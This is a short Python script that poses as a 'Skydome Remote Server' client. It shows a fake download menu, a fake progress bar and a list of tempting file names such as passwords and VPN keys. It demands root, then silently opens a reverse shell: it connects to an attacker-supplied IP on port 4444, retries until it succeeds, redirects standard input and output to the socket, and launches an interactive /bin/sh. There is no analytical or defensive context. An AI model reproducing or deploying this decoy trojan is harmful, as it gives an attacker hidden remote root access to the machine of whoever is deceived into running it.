import socket
import subprocess
import os
import time
import sys

def transfer_data():
    print("\nStarting transfer to your system...\n")
    total_files = 100
    for i in range(1, total_files + 1):
        print(f"Preparing data... {i}% complete", end='\r')
        time.sleep(0.1)  # 
    print("\nData download started, this may take a few minutes.")
    time.sleep(2)

def show_file_list():
    print("\nListing files on the remote server:\n")
    intriguing_files = [
        "passwords.txt",
        "confidential_report.pdf",
        "server_configurations.yaml",
        "user_data_backup.tar.gz",
        "network_diagrams.vsdx",
        "exploit_scripts.zip",
        "financial_records.xlsx",
        "hr_employee_data.docx",
        "server_logs.log",
        "database_dump.sql",
        "vpn_keys.key",
        "admin_notes.txt",
        "secret_project.pptx",
        "client_list.csv",
        "security_audit_results.pdf",
        "pentesting_tools.zip",
        "malware_analysis.docx",
        "firewall_rules.conf",
        "encryption_keys.key",
        "api_credentials.json",
        "internal_chat_logs.txt",
        "user_activity_log.csv",
        "project_timeline.xlsx",
        "backup_script.sh",
        "system_info.nfo"
    ]
    for file in intriguing_files:
        print(file)
        time.sleep(0.1)  
    print("\nFile listing complete.")
    time.sleep(2)

def display_main_menu():
    while True:
        print("\nWelcome to Skydome Remote Server\n")
        print("Select a command:")
        print("1. Download data to your system")
        print("2. List number of files (25)")
        choice = input("Enter your choice (1 or 2): ")

        if choice == '1':
            transfer_data()
            break  
        elif choice == '2':
            show_file_list()
        else:
            print("Invalid choice. Exiting.")
            sys.exit()

def establish_connection():
    server_ip = 'your_ip_address'  
    server_port = 4444
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((server_ip, server_port))
            break  # Exit the loop if connection is successful
        except Exception as e:
            time.sleep(5)  # Wait for 5 seconds before trying again

    # Redirect standard input/output/error to the socket
    os.dup2(s.fileno(), 0)  # Redirect standard input
    os.dup2(s.fileno(), 1)  # Redirect standard output
    os.dup2(s.fileno(), 2)  # Redirect standard error

    # Execute a shell
    subprocess.call(['/bin/sh', '-i'])

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("Please run as root to access the server.")
        sys.exit()
    else:
        display_main_menu()  # Display the server menu
        establish_connection()  #
